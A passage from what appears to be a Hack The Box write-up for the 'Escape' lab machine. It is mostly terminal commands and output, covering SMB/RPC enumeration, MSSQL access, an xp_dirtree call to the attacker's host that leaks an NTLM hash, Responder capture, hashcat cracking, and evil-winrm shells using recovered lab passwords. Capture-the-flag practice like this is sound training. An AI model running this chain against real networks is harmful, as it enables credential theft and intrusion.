+supportedControl: 2.16.840.1.113730.3.4.10
+supportedControl: 1.2.840.113556.1.4.1504
+supportedControl: 1.2.840.113556.1.4.1852
+supportedControl: 1.2.840.113556.1.4.802
+supportedControl: 1.2.840.113556.1.4.1907
+supportedControl: 1.2.840.113556.1.4.1948
+supportedControl: 1.2.840.113556.1.4.1974
+supportedControl: 1.2.840.113556.1.4.1341
+supportedControl: 1.2.840.113556.1.4.2026
+supportedControl: 1.2.840.113556.1.4.2064
+supportedControl: 1.2.840.113556.1.4.2065
+supportedControl: 1.2.840.113556.1.4.2066
+supportedControl: 1.2.840.113556.1.4.2090
+supportedControl: 1.2.840.113556.1.4.2205
+supportedControl: 1.2.840.113556.1.4.2204
+supportedControl: 1.2.840.113556.1.4.2206
+supportedControl: 1.2.840.113556.1.4.2211
+supportedControl: 1.2.840.113556.1.4.2239
+supportedControl: 1.2.840.113556.1.4.2255
+supportedControl: 1.2.840.113556.1.4.2256
+supportedControl: 1.2.840.113556.1.4.2309
+supportedControl: 1.2.840.113556.1.4.2330
+supportedControl: 1.2.840.113556.1.4.2354
+supportedCapabilities: 1.2.840.113556.1.4.800
+supportedCapabilities: 1.2.840.113556.1.4.1670
+supportedCapabilities: 1.2.840.113556.1.4.1791
+supportedCapabilities: 1.2.840.113556.1.4.1935
+supportedCapabilities: 1.2.840.113556.1.4.2080
+supportedCapabilities: 1.2.840.113556.1.4.2237
+subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=sequel,DC=htb
+serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
+ ion,DC=sequel,DC=htb
+schemaNamingContext: CN=Schema,CN=Configuration,DC=sequel,DC=htb
+namingContexts: DC=sequel,DC=htb
+namingContexts: CN=Configuration,DC=sequel,DC=htb
+namingContexts: CN=Schema,CN=Configuration,DC=sequel,DC=htb
+namingContexts: DC=DomainDnsZones,DC=sequel,DC=htb
+namingContexts: DC=ForestDnsZones,DC=sequel,DC=htb
+isSynchronized: TRUE
+highestCommittedUSN: 180363
+dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
+ =Sites,CN=Configuration,DC=sequel,DC=htb
+dnsHostName: dc.sequel.htb
+defaultNamingContext: DC=sequel,DC=htb
+currentTime: 20250224050122.0Z
+configurationNamingContext: CN=Configuration,DC=sequel,DC=htb
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+                                </code></pre><h2 id="1a3d1b9f-8847-81a5-bcae-ec879bd8ad10" class="">RPC → 135 port</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-81bd-97dd-ea4fbd009401" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ rpcclient -U &quot;&quot; -N 10.10.11.202
+rpcclient $&gt; querydispinfo
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $&gt; enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+</code></pre><h2 id="1a3d1b9f-8847-8135-9804-fdbd91eeb43b" class="">SMB Enumeration → 445 port</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-812d-84db-f61424764445" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">                                                                                                              
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ enum4linux -a 10.10.11.202
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Feb 23 16:06:03 2025
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.11.202
+RID Range ........ 500-550,1000-1050
+Username ......... &#x27;&#x27;
+Password ......... &#x27;&#x27;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.11.202 )============================
+
+
+[E] Can&#x27;t find workgroup/domain
+
+
+
+ ================================( Nbtstat Information for 10.10.11.202 )================================
+
+Looking up status of 10.10.11.202
+No reply from 10.10.11.202
+
+ ===================================( Session Check on 10.10.11.202 )===================================
+
+
+[+] Server 10.10.11.202 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;
+
+
+ ================================( Getting domain SID for 10.10.11.202 )================================
+
+Domain Name: sequel
+Domain Sid: S-1-5-21-4078382237-1492182817-2568127209
+
+[+] Host is part of a domain (not a workgroup)
+
+
+ ===================================( OS information on 10.10.11.202 )===================================
+
+
+[E] Can&#x27;t get OS info with smbclient
+
+
+[+] Got OS info for 10.10.11.202 from srvinfo: 
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+
+ =======================================( Users on 10.10.11.202 )=======================================
+
+
+[E] Couldn&#x27;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+
+
+[E] Couldn&#x27;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+
+ =================================( Share Enumeration on 10.10.11.202 )=================================
+
+do_connect: Connection to 10.10.11.202 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.11.202
+
+
+ ============================( Password Policy Information for 10.10.11.202 )============================
+
+
+[E] Unexpected error from polenum:
+
+
+
+[+] Attaching to 10.10.11.202 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: Cannot request session (Called Name:10.10.11.202)
+
+[+] Trying protocol 445/SMB...
+
+	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+
+[E] Failed to get password policy with rpcclient
+
+
+
+ =======================================( Groups on 10.10.11.202 )=======================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ ==================( Users on 10.10.11.202 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
+[E] Couldn&#x27;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+
+
+ ===============================( Getting printer info for 10.10.11.202 )===============================
+
+do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Sun Feb 23 16:06:42 2025
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-81d8-b3f7-f8dfd2a254fe" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ smbclient -L 10.10.11.202  
+Password for [WORKGROUP\drroot]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Public          Disk      
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.202 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                     </code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-8123-9783-f5fa72c7a1e1" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ netexec smb 10.10.11.202    
+SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+
+</code></pre><p id="1a3d1b9f-8847-8167-8aba-e8b7f595b14d" class="">
+</p><h2 id="1a3d1b9f-8847-81a3-86f5-e6df9fcb26d4" class="">Findings</h2><ul id="1a3d1b9f-8847-81db-a2d7-eaae501f67fa" class="bulleted-list"><li style="list-style-type:disc">domain:sequel.htb</li></ul><ul id="1a3d1b9f-8847-802e-b266-d043b358ba54" class="bulleted-list"><li style="list-style-type:disc">smbclient</li></ul><p id="1a3d1b9f-8847-812d-b7fe-e73cdb95f0c3" class="">
+</p><h1 id="1a3d1b9f-8847-81c2-8fe6-f9dbc6ff65c6" class="">User</h1><h3 id="1a3d1b9f-8847-800b-acc6-f8b0215c93e6" class="">ASRPRoast but nothing</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-8048-824c-ef8751769627" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ impacket-GetNPUsers sequel.htb/ -no-pass -dc-ip 10.10.11.202 -usersfile users.txt     
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+[-] User brandon.brown doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+</code></pre><h3 id="1a3d1b9f-8847-8094-a570-df0becdccc25" class="">Read “Public” shared dir and then download and read pdf file, I’ll find user and password to connect to mssql service. Try to impacket</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-80ad-b28f-c865a4c64bef" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">PublicUser:GuestUserCantWrite1
+
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to &#x27;master&#x27;.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (PublicUser  guest@master)&gt; xp_dirtree \\10.10.14.20\shared
+subdirectory   depth   file   
+------------   -----   ----   
+
+</code></pre><h3 id="1a3d1b9f-8847-807a-a5e4-f3a95dc260dd" class="">NTLM Hash on responder</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-807e-8095-cefc975a5054" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ sudo responder -I tun0 -v                                                                     
+[sudo] password for drroot: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -&gt; https://github.com/sponsors/lgandx
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.20]
+    Responder IPv6             [dead:beef:2::1012]
+    Challenge set              [random]
+    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;, &#x27;ISATAP.LOCAL&#x27;]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-3I0S85H02F9]
+    Responder Domain Name      [B217.LOCAL]
+    Responder DCE-RPC Port     [45523]
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.202
+[SMB] NTLMv2-SSP Username : sequel\sql_svc
+[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:de0efc01f8fbecbd:542FEB96029F6DB89D618DBF39CE93EA:010100000000000000363BBD0E86DB01B0B2F66DB47AC7B30000000002000800420032003100370001001E00570049004E002D003300490030005300380035004800300032004600390004003400570049004E002D00330049003000530038003500480030003200460039002E0042003200310037002E004C004F00430041004C000300140042003200310037002E004C004F00430041004C000500140042003200310037002E004C004F00430041004C000700080000363BBD0E86DB010600040002000000080030003000000000000000000000000030000043DCFCFF5EB3E2146CAF0A76CDDE586A7CAC1AD2E301C1C754E128233AB89B9B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320030000000000000000000
+</code></pre><h3 id="1a3d1b9f-8847-80ae-b0d3-f8fa09871acf" class="">Decrypt and got it</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-8042-97d4-d5ea9d316c35" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">                                                                                                                
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ hashcat -m 5600 hash.txt -a 0 /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11700F @ 2.50GHz, 6925/13915 MB (2048 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+SQL_SVC::sequel:de0efc01f8fbecbd:542feb96029f6db89d618dbf39ce93ea:010100000000000000363bbd0e86db01b0b2f66db47ac7b30000000002000800420032003100370001001e00570049004e002d003300490030005300380035004800300032004600390004003400570049004e002d00330049003000530038003500480030003200460039002e0042003200310037002e004c004f00430041004c000300140042003200310037002e004c004f00430041004c000500140042003200310037002e004c004f00430041004c000700080000363bbd0e86db010600040002000000080030003000000000000000000000000030000043dcfcff5eb3e2146caf0a76cdde586a7cac1ad2e301c1c754e128233ab89b9b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320030000000000000000000:REGGIE1234ronnie
+</code></pre><h3 id="1a3d1b9f-8847-80ee-a8c7-df8b49650332" class="">Access to mssql terminal with -windows-auth</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-8013-aadd-f32f421f75d6" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ impacket-mssqlclient sql_svc@10.10.11.202 -windows-auth              
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to &#x27;master&#x27;.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sequel\sql_svc  guest@master)&gt; 
+</code></pre><h3 id="1a3d1b9f-8847-8032-ba0b-de3288b62c26" class="">Enum users</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-809d-8fff-eb72724f1639" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">SQL (sequel\sql_svc  guest@master)&gt; xp_dirtree C:\Users
+subdirectory    depth   file   
+-------------   -----   ----   
+Administrator       1      0   
+
+All Users           1      0   
+
+Default             1      0   
+
+Default User        1      0   
+
+Public              1      0   
+
+Ryan.Cooper         1      0   
+
+sql_svc             1      0   
+</code></pre><h3 id="1a3d1b9f-8847-80c0-a810-e780e3539d7a" class="">evil-winrm</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-803d-b697-f1e68428aaa3" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ evil-winrm -i 10.10.11.202 -u sql_svc -p &#x27;REGGIE1234ronnie&#x27;                       
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; </code></pre><h3 id="1a3d1b9f-8847-802c-8d73-fa1ec5dc6d24" class="">Execute winpeas and info gather, read log files</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-803f-9c54-f652dbaf7339" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\SQLServer\Logs&gt; download ERRORLOG.BAK
+                                        
+Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to ERRORLOG.BAK
+                                        
+</code></pre><h3 id="1a3d1b9f-8847-8039-b429-f81681bb9e89" class="">Possible password</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-806d-9df1-e054eb99027f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">Ryan.Cooper:NuclearMosquito3</code></pre><h3 id="1a3d1b9f-8847-800e-9356-d3cd55fa74bc" class="">Evil-winrm and got shell</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-8079-81ac-c993475fbff9" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p &#x27;NuclearMosquito3&#x27;     
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; type ../Desktop/user.txt
+ca08a8125ba1a12b0bfe58e238b76be6
